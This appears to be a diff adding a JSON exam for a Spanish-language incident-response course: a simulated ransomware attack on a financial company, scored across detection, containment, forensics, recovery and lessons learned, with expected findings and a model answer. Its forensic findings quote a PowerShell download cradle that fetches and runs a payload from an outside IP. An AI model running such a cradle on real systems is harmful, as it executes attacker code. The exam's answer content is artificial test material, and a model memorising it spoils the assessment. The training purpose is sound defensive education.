@@ -1,0 +1,307 @@
+[
+  {
+    "screen_id": 1,
+    "type": "final_exam_intro",
+    "title": "Evaluación Final Curso 4: Respuesta Completa a Ransomware APT",
+    "duration": 180,
+    "content": {
+      "scenario": "Empresa financiera de 1000 empleados sufre ataque de ransomware APT. Como Senior Incident Responder, debes ejecutar respuesta completa siguiendo el ciclo NIST IR: Detection → Containment → Eradication → Recovery → Post-Incident.",
+      "your_role": "Senior Incident Response Analyst - CSIRT Lead",
+      "situation": "Viernes 02:00 AM - SIEM alerta de cifrado masivo de archivos en file servers. EDR muestra ransomware ejecutándose en 50+ workstations. Nota de rescate exige 100 BTC ($4M USD). CEO te llama exigiendo solución inmediata.",
+      "objectives": [
+        "Detectar y analizar el ataque completo",
+        "Contener propagación y minimizar daño",
+        "Realizar forense digital y extraer IOCs",
+        "Erradicar malware y recuperar operaciones",
+        "Documentar y presentar lessons learned"
+      ],
+      "time_limit": "180 minutos",
+      "passing_score": "70%",
+      "total_points": 100
+    }
+  },
+  {
+    "screen_id": 2,
+    "type": "incident_analysis",
+    "title": "FASE 1: Detección y Análisis (25 puntos)",
+    "content": {
+      "initial_indicators": {
+        "siem_alerts": [
+          "02:15 - Mass file encryption detected on FS01, FS02, FS03",
+          "02:17 - EDR: 52 workstations with 'cryptor.exe' process",
+          "02:20 - Firewall: 500+ connections to 185.220.101.45:443 (Tor)",
+          "01:45 - Multiple SMB logins with 'admin' account (30 min before)"
+        ],
+        "edr_telemetry": {
+          "process": "cryptor.exe",
+          "parent": "powershell.exe",
+          "command_line": "cryptor.exe -encrypt -path C:\\ -key [base64]",
+          "network": "185.220.101.45:443",
+          "file_changes": "23,450 files encrypted with .locked extension"
+        },
+        "ransom_note": "LOCKED_README.txt: Your files are encrypted. Pay 100 BTC to [address] within 72 hours or lose data forever. Email: recovery@darkmail.onion"
+      },
+      "tasks": [
+        {
+          "task": "Construir timeline completo del ataque",
+          "points": 8,
+          "requirements": [
+            "Initial access vector",
+            "Lateral movement methods",
+            "Data exfiltration (si hubo)",
+            "Ransomware deployment",
+            "Usar MITRE ATT&CK® para mapear TTPs"
+          ]
+        },
+        {
+          "task": "Extraer IOCs del incidente",
+          "points": 7,
+          "iocs_to_find": [
+            "IP C2: 185.220.101.45",
+            "Hash de cryptor.exe",
+            "Domain: recovery@darkmail.onion",
+            "Compromised accounts: 'admin'",
+            "File extension: .locked",
+            "Bitcoin address"
+          ]
+        },
+        {
+          "task": "Identificar scope del compromiso",
+          "points": 5,
+          "determine": [
+            "Número de sistemas afectados",
+            "Qué datos fueron cifrados/exfiltrados",
+            "Si hay sistemas no afectados aún",
+            "Si atacante tiene acceso activo"
+          ]
+        },
+        {
+          "task": "Clasificar severidad del incidente",
+          "points": 5,
+          "criteria": "Usar escala: Low/Medium/High/Critical basado en impacto (CIA), número de sistemas, datos sensibles, continuidad de negocio"
+        }
+      ]
+    }
+  },
+  {
+    "screen_id": 3,
+    "type": "containment_phase",
+    "title": "FASE 2: Contención (20 puntos)",
+    "content": {
+      "decision_point": "¿Apagar todo inmediatamente o contención quirúrgica? Considera: pérdida de evidencia volátil vs detener propagación.",
+      "containment_actions": [
+        {
+          "action": "Short-term Containment (inmediato)",
+          "tasks": [
+            "Aislar sistemas afectados de red (deshabilitar puertos, disconnect WiFi)",
+            "Bloquear IP C2 en firewall (185.220.101.45)",
+            "Deshabilitar cuenta 'admin' comprometida",
+            "Snapshot VMs antes de apagar (preservar evidencia)",
+            "Comunicar a usuarios: NO abrir archivos sospechosos"
+          ],
+          "points": 8
+        },
+        {
+          "action": "Long-term Containment (siguiente 24-48h)",
+          "tasks": [
+            "Segmentar red: aislar file servers de workstations",
+            "Implementar reglas firewall adicionales",
+            "Aumentar logging y monitoring",
+            "Hunting proactivo en sistemas no afectados aún",
+            "Preparar clean recovery environment"
+          ],
+          "points": 7
+        }
+      ],
+      "business_decisions": {
+        "question": "CEO pregunta: ¿Pagamos el rescate?",
+        "your_recommendation": {
+          "considerations": [
+            "FBI recomienda NO pagar (financia crimen)",
+            "No garantía de decrypt key funcional",
+            "Posible re-infección si no se erradica",
+            "Legal/compliance: algunos sectores prohiben pago",
+            "Backups disponibles? (si sí, restaurar; si no, más presión)"
+          ],
+          "answer": "Recomendar NO pagar. Enfocarse en recovery desde backups y erradicación completa. Si backups inadecuados, es decisión de negocio pero técnicamente no recomendado.",
+          "points": 5
+        }
+      }
+    }
+  },
+  {
+    "screen_id": 4,
+    "type": "forensic_investigation",
+    "title": "FASE 3: Análisis Forense (20 puntos)",
+    "content": {
+      "forensic_tasks": [
+        {
+          "task": "Memory Forensics",
+          "description": "Capturar RAM de 3 sistemas afectados antes de apagar",
+          "analysis": [
+            "Volatility: pslist - identificar cryptor.exe y parent processes",
+            "netscan - confirmar C2 connection activa",
+            "malfind - detectar code injection si hubo",
+            "cmdscan - ver comandos PowerShell ejecutados"
+          ],
+          "findings": "cryptor.exe spawned por powershell.exe. PowerShell ejecutó download cradle: IEX(wget 'http://185.220.101.45/payload'). Confirma fileless initial stage.",
+          "points": 8
+        },
+        {
+          "task": "Disk Forensics",
+          "description": "Analizar disco de patient zero (primera máquina infectada)",
+          "analysis": [
+            "Prefetch: qué programas ejecutaron recientemente",
+            "Browser history: email malicioso abierto?",
+            "MFT timeline: cuándo apareció cryptor.exe",
+            "Recover deleted files: posible dropper eliminado"
+          ],
+          "findings": "Timeline muestra: phishing_invoice.xlsm abierto 01:30 AM → powershell.exe 01:31 → cryptor.exe descargado 01:32 → cifrado masivo 02:15. Dropper Excel con macro VBA.",
+          "points": 7
+        },
+        {
+          "task": "Network Forensics",
+          "description": "Analizar PCAP del período 01:00-03:00",
+          "analysis": [
+            "Wireshark: filtrar IP 185.220.101.45",
+            "Identificar beaconing pattern",
+            "Buscar exfiltración (large uploads)",
+            "DNS queries sospechosas"
+          ],
+          "findings": "Beaconing cada 60 seg a C2. 2GB uploaded 01:50-02:10 (pre-encryption exfiltration). Double extortion: cifran Y roban datos para leverage.",
+          "points": 5
+        }
+      ]
+    }
+  },
+  {
+    "screen_id": 5,
+    "type": "eradication_recovery",
+    "title": "FASE 4: Erradicación y Recuperación (20 puntos)",
+    "content": {
+      "eradication": {
+        "steps": [
+          "Reimagear todos los sistemas afectados (no confiar en cleanup)",
+          "Cambiar TODAS las contraseñas (admin, service accounts, users)",
+          "Rotar credenciales de sistemas (API keys, certs)",
+          "Patch vulnerabilidades identificadas",
+          "Desplegar EDR mejorado con reglas anti-ransomware"
+        ],
+        "validation": "Hunting sweep completo: buscar IOCs en TODA la red. SIEM queries, EDR searches, memory scans en sample de sistemas limpios.",
+        "points": 8
+      },
+      "recovery": {
+        "priority_order": [
+          "1. Critical: Domain Controllers, File Servers (from clean backups)",
+          "2. High: Email, VPN, Core business apps",
+          "3. Medium: Workstations (gradual reimaging)",
+          "4. Low: Dev/test systems"
+        ],
+        "backup_restoration": {
+          "verify": "Antes de restaurar, verificar que backups no están infectados. Test en ambiente aislado.",
+          "clean_point": "Identificar backup limpio (pre-infection). En este caso: backup de 3 días antes (Thu 23:00) es clean.",
+          "data_loss": "Perderán 3 días de cambios. Comunicar a business. Reconstruir manualmente donde sea crítico."
+        },
+        "validation_before_production": [
+          "AV/EDR scan completo de sistemas restaurados",
+          "Network monitoring intensivo primera semana",
+          "User acceptance testing (UAT)",
+          "Phased rollout, no big bang"
+        ],
+        "points": 12
+      }
+    }
+  },
+  {
+    "screen_id": 6,
+    "type": "post_incident_activity",
+    "title": "FASE 5: Post-Incidente (15 puntos)",
+    "content": {
+      "lessons_learned": {
+        "meeting": "Facilitar sesión 1 semana después con CSIRT, IT, management, affected business units.",
+        "root_causes": [
+          "Technical: Backups en misma red que production (también infectados parcialmente)",
+          "Process: Phishing awareness training desactualizado (último fue hace 2 años)",
+          "People: Usuario habilitó macros sin verificar",
+          "Technology: EDR no tenía behavioral detection de ransomware"
+        ],
+        "recommendations": [
+          "CRITICAL: Implementar backups 3-2-1 con copia offline/immutable",
+          "CRITICAL: EDR upgrade con anti-ransomware behavioral detection",
+          "HIGH: Security awareness training trimestral con phishing simulations",
+          "HIGH: Email gateway con sandbox para attachments",
+          "MEDIUM: Deshabilitar macros vía GPO para emails externos",
+          "MEDIUM: Segmentación de red mejorada",
+          "LOW: Cyber insurance review (cobertura de ransomware?)"
+        ],
+        "points": 8
+      },
+      "documentation": {
+        "executive_report": "1-2 páginas para Board: qué pasó, impacto ($4M potential ransom, 3 days downtime, ~$2M actual losses), qué hicimos, qué necesitamos (budget para recommendations).",
+        "technical_report": "30+ páginas: timeline completo, IOCs, TTPs (MITRE ATT&CK® mapped), forensic findings, all logs/evidence, detailed recovery steps.",
+        "compliance_report": "Si aplica: GDPR breach notification (si PII exfiltrado), regulatory reporting, insurance claim documentation.",
+        "points": 4
+      },
+      "threat_intel_sharing": {
+        "action": "Compartir IOCs con FS-ISAC, CISA. Ayuda comunidad financiera. TLP: AMBER (limited distribution).",
+        "points": 3
+      }
+    }
+  },
+  {
+    "screen_id": 7,
+    "type": "final_deliverables",
+    "title": "Entregables Finales (Evaluación)",
+    "content": {
+      "deliverable_1": {
+        "name": "Timeline Completo del Incidente",
+        "requirements": [
+          "Cronología desde initial access hasta recovery",
+          "Mapeo a MITRE ATT&CK® TTPs",
+          "Pivot points identificados",
+          "Evidence references (logs, forensics)"
+        ],
+        "format": "Timeline visual + tabla detallada"
+      },
+      "deliverable_2": {
+        "name": "IOC Package",
+        "requirements": [
+          "IPs, domains, hashes, accounts comprometidos",
+          "YARA rules o Snort signatures si aplica",
+          "Formato STIX/JSON para sharing"
+        ],
+        "format": "Structured threat intel format"
+      },
+      "deliverable_3": {
+        "name": "Executive Report",
+        "requirements": [
+          "Business impact quantified",
+          "Recovery status",
+          "Recommendations priorizadas con costs",
+          "Risk if no action taken"
+        ],
+        "format": "PowerPoint o 2-page PDF"
+      },
+      "deliverable_4": {
+        "name": "Technical Report",
+        "requirements": [
+          "Forensic analysis completo",
+          "All evidence preserved (chain of custody)",
+          "Detailed recovery procedures",
+          "Lessons learned document"
+        ],
+        "format": "30+ page document"
+      },
+      "deliverable_5": {
+        "name": "Improved IR Playbook",
+        "requirements": [
+          "Updated ransomware playbook con lessons learned",
+          "Decision trees para containment",
+          "Contact list updated",
+          "Communication templates"
+        ],
+        "format": "Updated living document"
+      }
+    }
+  }
+]
